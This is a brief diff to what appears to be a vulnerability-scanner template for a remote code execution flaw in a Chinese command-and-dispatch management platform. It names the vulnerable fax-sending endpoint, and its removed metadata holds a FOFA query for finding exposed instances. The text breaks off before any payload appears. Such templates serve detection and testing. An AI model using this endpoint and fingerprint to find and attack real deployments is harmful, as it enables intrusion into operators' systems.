@@ -3,12 +3,8 @@ info:
   name: 福建科立讯通信指挥调度管理平台 feedback 存在RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/scz5xzg4e0qfgv0i'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: scz5xzg4e0qfgv0i
-    fofa: app=”指挥调度管理平台”
 http:
 - raw:
   - 'POST /custom/zx/fax/send_fax.php HTTP/1.1
